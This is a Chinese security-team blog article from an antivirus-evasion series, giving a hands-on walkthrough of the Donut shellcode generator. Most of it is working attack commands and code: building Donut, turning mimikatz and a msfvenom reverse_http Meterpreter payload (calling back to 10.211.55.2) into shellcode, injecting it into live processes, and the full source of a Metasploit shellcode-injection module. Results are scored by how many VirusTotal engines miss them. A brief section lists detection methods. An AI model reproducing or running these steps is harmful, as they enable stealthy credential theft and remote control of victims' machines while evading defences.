> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DoWRTIIBwuvzRd59wIWpXw)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

2020 年初，从网上搜集了多种免杀工具和方式，汇总整理了远控免杀专题文章的工具篇、代码篇、白名单篇等，共 70 篇文章。现时隔一年，听到不少免杀爱好者的追更诉求，同时也看到了很多新的 bypassAV 的工具和技巧，于是想把这个系列继续补充一些，内容也都是来自互联网，汇总到一起只是方便大家查阅参考。

免杀专题已完成的文章及相关软件下载：**https://github.com/TideSec/BypassAntiVirus**

免杀专题在线文库：**https://www.yuque.com/tidesec/bypassav**

0x00 引用说明
=========

本文内容参考节选自以下资料：

Donut 项目：`https://github.com/TheWover/donut`

`3gstudent`大佬的文章：`https://3gstudent.github.io/Shellcode生成工具Donut测试分析`

Msf+Donut 执行任意可执行文件：`https://www.cnblogs.com/websecyw/p/12082323.html`

0x01 Donut 介绍
=============

Donut 是一个 shellcode 生成工具，可以从. NET 程序集中创建 position-independant（位置无关）的 shellcode 有效负载。此 shellcode 可用于将程序集注入到任意 Windows 进程中。随意给出一个. NET 程序集，参数和入口点（例如 Program.Main），该工具可以生成 position-independant 的 shellcode，并且从内存加载。.NET 程序集可以通过 URL 加载，或者直接嵌入在 shellcode 中。

Donut 项目地址：

```
https://github.com/TheWover/donut
```

donut 提供了四个配套项目：

```
DemoCreateProcess：用于测试的.NET程序集示例。采用两个命令行参数，每个参数指定要执行的程序。DonutTest：用于测试donut的简单C# shellcode injector。shellcode必须是base64编码，并以字符串形式复制。ModuleMonitor：一个概念验证工具，可以检测CLR注入，因为它是由Donut和Cobalt Strike的执行程序集等工具完成。ProcessManager：一个进程发现工具，攻击者可以使用它来确定注入的内容，防御者则可以用来确定正在运行的内容，这些进程具有哪些属性，以及它们是否加载了CLR。
```

0x02 Donut 安装
=============

下载`https://github.com/TheWover/donut`

我本机安装的 VS2017，在 donut 目录下执行`nmake -f Makefile.msvc`进行编译，发现报错。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TQ65sxrnAf4PC93pbd1ay0aZmYSa3k6iccrzCkJfyJfDVYvibn28Gmleg/640?wx_fmt=png)

报错信息：

```
正在生成代码...NMAKE : fatal error U1077: “"C:\Program Files (x86)\Microsoft Visual Studio\2017\Enterprise\VC\Tools\MSVC\14.16.27023\bin\Hostx86\x86\cl.EXE"”: 返回代码0x2
```

解决方法：在`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Visual Studio 2017\Visual Studio Tools\VC`目录中运行`适用于 VS 2017 的 x64 本机工具命令提示`。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TUTb66L3JTpCD058pliaVkRffwg8F5kkRpOmckwoOK2mjvA2p7zXha7A/640?wx_fmt=png)

执行编译。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TMZKq2hVGDX6MvmjnibfPgpO2TPU31dO9jISWEryibqtHpZXibbHjPiaZhA/640?wx_fmt=png)

编译后的最新版本是 0.93

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TjelTuPIibSRHdzWhGqcQlKX4ISKaicyLmGXz6jicygJrmLXdOxTdpEKtg/640?wx_fmt=png)

当然也可以下载编译好的 donut.exe 文件 `https://github.com/TheWover/donut/releases`。

0x03 Donut 的常规使用
================

1、选择测试 dll
----------

这里使用子项目`DemoCreateProcess`

编译后生成文件 DemoCreateProcess.dll，注意要用`.net 3.5`或更高版本。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TZCgeNm9X3aryUCdMR3oiaM7RzsVAzS8icnBeDSu3ywZ5HndtmnibwEBWQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TDlyNKurjsPEibcoboXIwpUTNR6PsOiaBd6PvD9552hJXoib9ibLZeC2mfw/640?wx_fmt=png)

2、使用 Donut 生成 shellcode
-----------------------

32 位：

```
donut.exe  DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -a 1
```

64 位：

```
donut.exe  DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -a 2
```

不适用`-a`参数时，会生成 x86+x64 的。

```
donut.exe  DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
```

命令执行后生成 bin 文件

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TBsW2yrkqHcGcNOMiaL4eqpqcWEEzcKgAFnV6iaSMk15kUibC1YfTpML4A/640?wx_fmt=png)

如果加了 - s 指定 URL，会再生成一个随机名称的 Module 文件，实例如下：

```
donut.exe  DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe  -s http://10.211.55.2
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4Tnia2EaO0mUdALiaWgTPfZbrQEmib0gmTwfstHpIoJIIeCPCljnGKF6xUg/640?wx_fmt=png)

生成文件`loader.bin`和`YT7TF4RH`，将`YT7TF4RH`上传到 http://10.211.55.2，接下来通过注入 shellcode 的方式执行`loader.bin`，loader.bin 会从`http://10.211.55.2/YT7TF4RH`下载实际的 shellcode 并执行。

3、查看进程信息
--------

这里使用子项目 ProcessManager.exe

列出进程后，Managed 选项如果为 True，代表该进程已经加载 CLR

ProcessManager 支持对指定进程进行筛选，例如只查看 notepad.exe 的进行信息，命令如下。notepad.exe 进程 id 为 12036。

```
ProcessManager.exe --name notepad
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TKu5r3BibgxjK2f0lI0l2rO9xZ1IjeKELcUmxCnsKRzEVCoPtu5OeOMQ/640?wx_fmt=png)

4、注入 shellcode
--------------

假设目标进程为 12036

*   (1) 使用子项目 DonutTest
    

将上面的 loader.bin 作 base64 编码并保存在剪贴板，powershell 命令如下：

```
$filename = "loader.bin"[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```

替换 DonutTest 工程中对应的变量。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TbrO63zjhNHgsusyAmUuPibKNVUAdzX9II8F1BkJvlAo1SGfkf5de6OQ/640?wx_fmt=png)

**编译前需要把. net 修改为 3.5，切记**。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4T5PApKiaHvQXA5L9ibSTo7C3OgUM6Zz48qSfboTPKUmHy1BKPXLvJpFSQ/640?wx_fmt=png)

编译成功后执行如下命令，可成功弹出 calc 和 notepad。

```
DonutTest.exe 12036
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TY2dEsRc3IMiaPCQhEL9wS06hAXZdHjMvXgc7zH1rUviaufAvIiaTps3Yg/640?wx_fmt=png)

*   (2) 使用 RtlCreateUserThread
    

`https://github.com/TheWover/donut/blob/master/payload/inject.c`

在 vs 中新建一个空项目

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TMBTuJ1PaIjqbzGo21bBjkX8hfOvIbfk29Fons24uQ1vXG0PBib6x9rA/640?wx_fmt=png)

新建源文件`inject.c`，把内容复制过去，编译生成`Project1.exe`，也就是我们需要的`inject.exe`，复制到 donut 根目录下。

命令如下：

```
inject.exe 9668 loader.bin
```

可正常弹计算器。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TvdKVPTveKz5ibRgMStUUCtLrj59bQCmiaVUUnxHczTdxeiaKNx7oANdibA/640?wx_fmt=png)

5、VT 免杀效果（30/67）
----------------

测了半天发现这个 donut 的免杀效果太差，就这个测试 dll，在 virustotal.com 上大部分都能静态查杀。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TvCibL0ocKFkibeMZyLSPCtjphDUiaw3gCarOUyxXhFhVI60VtAbmm7nNQ/640?wx_fmt=png)

inject.exe 的查杀结果

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TVArjD96DBpm1evCzU30P1eyZ7PrD8MJMqJLfryPvic2qF8GCaoN0Nog/640?wx_fmt=png)

0x04 Donut 执行 mimikatz
======================

先使用 donut 把 mimiktaz.exe 转为 bin 文件，使用 donut0.93 测试有点问题，我换了 donut0.92 版。

```
donut.exe -f mimikatz.exe -o mimi.bin
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TPmvCgIWMz0ibYn0rEXBjoC9yzLjaZ1hx5ia7ZAp7dWAJ6JsmTTGSEVdw/640?wx_fmt=png)

将 mimi.bin 作 base64 编码并保存在剪贴板，powershell 命令如下：

```
$filename = "mimi.bin"[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```

把 base64 编码复制到 DonutTest 工程中。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TNtxmlSYoJ6XIMWkGzU9rFkdrHYCpbibUkY7xpBRdsPjibndzMNjKfJXg/640?wx_fmt=png)

编译生成 exe。

在注入进程时，发现注入到 notepad.exe 中无法执行，但注入到 powershell 中可以执行。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TJ2UDDIEdPZIiblC3bGHlMc7dTNBLayibp1YrL9iceswcMiafsWewTARmQA/640?wx_fmt=png)

VT 免杀率 30/66，怎一个惨字了得。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4T3C2HvKicMSFrkHRdl4y8mvY50yTkCrPnC8szHJE2jiarASzQSLuHntNg/640?wx_fmt=png)

0x05 Donut 执行 msf 的 exe
=======================

先用 msf 生成 exe

```
msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=10.211.55.2 LPORT=3333 -b ""\x00"" -f exe -o shell.exe
```

用 donut 把 shell.exe 转为 bin 文件。

```
donut.exe -f shell.exe -o shell.bin
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TSsbx8ZhmibIDb0Xk1chUAXGYXricmnuQXDUD26kcTYsib5FDo3b2kTeEA/640?wx_fmt=png)

将 mimi.bin 作 base64 编码并保存在剪贴板，powershell 命令如下：

```
$filename = "mimi.bin"[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```

把 base64 编码复制到 DonutTest 工程中。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TAtEMEXVrx6fKFguicLBWDYbO5MGhOdJvutAPwYyhyxMOTL8YvXU5iaYQ/640?wx_fmt=png)

编译生成 exe。

在注入进程时，因为我的 shellcode 是 x86 的，所以注入到 64 位的 notepad.exe 中无法执行，需要注入到 x86 的进程中才可以。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TlDsiayDtXeTqoODLxycRMrPw9WhZ9dwLe8XmB4gbhUcj86cZIWBcNvQ/640?wx_fmt=png)

msf 中监听，可上线

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TArrSr5JTxR4y80Wul2OYhs6HG7AoAicHB7ia9vDtONk5suwNHbWhpSTg/640?wx_fmt=png)

0x06 Donut 执行任意可执行文件
====================

Donut 下载`https://github.com/TheWover/donut`

准备的`shellcode_inject.rb`代码

```
### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'msf/core/post/common'require 'msf/core/post/windows/reflective_dll_injection'class MetasploitModule < Msf::Post  include Msf::Post::Common  include Msf::Post::Windows::ReflectiveDLLInjection  def initialize(info={})    super( update_info( info,      'Name'          => 'Windows Manage Memory Shellcode Injection Module',      'Description'   => %q{        This module will inject into the memory of a process a specified shellcode.      },      'License'       => MSF_LICENSE,      'Author'        => [ 'phra <https://iwantmore.pizza>' ],      'Platform'      => [ 'win' ],      'SessionTypes'  => [ 'meterpreter' ]    ))    register_options(      [        OptPath.new('SHELLCODE', [true, 'Path to the shellcode to execute']),        OptInt.new('PID', [false, 'Process Identifier to inject of process to inject the shellcode. (0 = new process)', 0]),        OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', true]),        OptBool.new('INTERACTIVE', [true, 'Interact with the process', true]),        OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),        OptEnum.new('BITS', [true, 'Set architecture bits', '64', ['32', '64']])      ])  end  # Run Method for when run command is issued  def run    # syinfo is only on meterpreter sessions    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?    # Set variables    shellcode = IO.read(datastore['SHELLCODE'])    pid = datastore['PID']    bits = datastore['BITS']    p = nil    if bits == '64'      bits = ARCH_X64    else      bits = ARCH_X86    end    if pid == 0 or not has_pid?(pid)      p = create_temp_proc(bits)      print_status("Spawned process #{p.pid}")    else      print_status("Opening process #{p.pid}")      p = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)    end    if bits == ARCH_X64 and client.arch == ARCH_X86      print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")      print_error("Migrate to an x64 process and try again.")      return false    elsif arch_check(bits, p.pid)      inject(shellcode, p)    end  end  # Checks the Architeture of a Payload and PID are compatible  # Returns true if they are false if they are not  def arch_check(bits, pid)    # get the pid arch    client.sys.process.processes.each do |p|      # Check Payload Arch      if pid == p["pid"]        print_status("Process found checking Architecture")        if bits == p['arch']          print_good("Process is the same architecture as the payload")          return true        else          print_error("The PID #{ p['arch']} and Payload #{bits} architectures are different.")          return false        end      end    end  end  # Creates a temp notepad.exe to inject payload in to given the payload  # Returns process PID  def create_temp_proc(bits)    windir = client.sys.config.getenv('windir')    # Select path of executable to run depending the architecture    if bits == ARCH_X86 and client.arch == ARCH_X86      cmd = "#{windir}\\System32\\notepad.exe"    elsif bits == ARCH_X64 and client.arch == ARCH_X64      cmd = "#{windir}\\System32\\notepad.exe"    elsif bits == ARCH_X64 and client.arch == ARCH_X86      cmd = "#{windir}\\Sysnative\\notepad.exe"    elsif bits == ARCH_X86 and client.arch == ARCH_X64      cmd = "#{windir}\\SysWOW64\\notepad.exe"    end    proc = client.sys.process.execute(cmd, nil, {      'Hidden' => datastore['HIDDEN'],      'Channelized' => datastore['CHANNELIZED'],      'Interactive' => datastore['INTERACTIVE']    })    return proc  end  def inject(shellcode, p)    print_status("Injecting shellcode into process ID #{p.pid}")    begin      print_status("Allocating memory in process #{p.pid}")      mem = inject_into_process(p, shellcode)      print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{shellcode.length} byte shellcode")      p.thread.create(mem, 0)      print_good("Successfully injected payload into process: #{p.pid}")      if datastore['INTERACTIVE'] && datastore['CHANNELIZED'] && datastore['PID'] == 0        print_status("Interacting")        client.console.interact_with_channel(p.channel)      elsif datastore['CHANNELIZED']        print_status("Retrieving output")        data = p.channel.read        print_line(data) if data      end    rescue ::Exception => e      print_error("Failed to inject Payload to #{p.pid}!")      print_error(e.to_s)    end  endend
```

1、首先使用 Donut 对需要执行的文件进行 shellcode 生成, 这里对 mimi 进行 shellcode 生成, 生成 bin 文件, 等下会用到。

经测试，这里我用的 Donut_v0.9.2 版，0.9.3 版生成的 bin 文件无法加载，不知道什么原因。

```
donut.exe -f mimikatz.exe -a 2 -o mimi.bin
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TArrSr5JTxR4y80Wul2OYhs6HG7AoAicHB7ia9vDtONk5suwNHbWhpSTg/640?wx_fmt=png)

2、将上面的`shellcode_inject.rb`放入`/opt/metasploit-framework/embedded/framework/modules/post/windows/manage`下 (实际路径可能不同, 也就是 metasploit-framework 的上级路径, 根据实际情况调整), 然后进入 msf,reload_all 同时载入所有模块。

kali 里是在目录`/usr/share/metasploit-framework/modules/post/windows/manage/`

mac 下是在`/opt/metasploit-framework/embedded/framework/modules/post/windows/manage`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TTFC8ib4UEEbZNOXpHXV86zzVqfmoibMBIuKJLTv5WRyXegLViaSCxicE8Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TTZjXnmOQHYKAxEzeqG9s5CczBw3J7Ndsx4wdmrnppkWOFdsiaNBEvRg/640?wx_fmt=png)

3、使用之前载入的 shellcode_inject 注入模块, 这里是获取 session 后的操作了, session 先自己上线再进行以下操作

```
use post/windows/manage/shellcode_injectset session 2set shellcode /tmp/payload.bin run
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TwL4TYhR8jWgn8fqUcIRwlyB2uUI7tOAJj10ebEnMHSAiayuqSGljweg/640?wx_fmt=png)

最后成功加载了 mimi, 使用 shellcode 注入执行, 有更强的隐蔽性。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXgUgPTYHt4e5iaptf1MWD4TI74Ypa5GVXfe0ZBb9jNLGJJwOpI9IuLtnu6Sb7Duqu1noV3O1PRUyg/640?wx_fmt=png)

0x07 Donut 特点分析
===============

Donut 能够将. NET 程序集转换为 shellcode

也就是说，使用 C# 开发的程序都能通过 Donut 转换成 shellcode

就目前的趋势来说，C# 开源的工具越来越多，例如：

```
https://github.com/GhostPack/SharpWMI
https://github.com/checkymander/Sharp-WMIExec
https://github.com/jnqpblc/SharpTask
```

在渗透测试中，C# 将会逐步替代 Powershell，Donut 的利用也会是一个趋势

**Donut 的利用思路：**

将. NET 程序集转换为 shellcode，例如配合 SILENTTRINITY 使用 作为模块集成到其他工具中 扩展功能：支持类似 meterpreter 的 migrate 功能 为了更为隐蔽，可以先使用 ProcessManager 列举已经加载 CLR 的进程，对其进行注入

**Donut 的检测：**

Donut 需要使用 CLR 从内存中加载. NET 程序集，可采取以下方法进行检测：

进程不是. NET 程序集 进程加载了与 CLR 相关的 dll(dll 以”msco” 开头) 注：正常程序也有可能存在这个行为

**两种检测方法：**

```
使用命令tasklist /m msco*
使用WMI事件Win32_ModuleLoadTrace来监视模块加载
```

对满足以上条件的进程重点监控

Donut 基于 execute-assembly，以 shellcode 的形式实现从内存中加载. NET 程序集，优点是注入到其他进程时不再依赖于 Dll 反射，更隐蔽，更易于扩展。更隐蔽是指注入其他进程时不会存在 dll，更易于扩展是指能够执行 shellcode 的方法都可以使用 Donut，基于 Donut 的二次开发也很容易。

0x08 参考资料
=========

Shellcode 生成工具 Donut 测试分析:`https://3gstudent.github.io/3gstudent.github.io/Shellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Donut%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/`

Donut：将. NET 程序集注入 Windows 进程:`https://www.freebuf.com/sectool/206154.html`

Donut 和 MSF 以 shellcode 注入的方式执行任意文件：`https://www.cnblogs.com/Chuantouli/p/12275466.html`

Msf+Donut 执行任意可执行文件：`https://www.cnblogs.com/websecyw/p/12082323.html`

Donut - Injecting .NET Assemblies as Shellcode：`https://thewover.github.io/Introducing-Donut/`

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室。团队公众号自创建以来，共发布原创文章 370 余篇，自研平台达到 26 个，目有 15 个平台已开源。此外积极参加各类线上、线下 CTF 比赛并取得了优异的成绩。如有对安全行业感兴趣的小伙伴可以踊跃加入或关注我们。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RX4MU7S4WB8R6vF3JbUjA7K0ZtOPxqGSo1HGPhTDicQibOro93UYNBOwRPd4EFseGTDsl1tan0ZXcmw/640?wx_fmt=gif)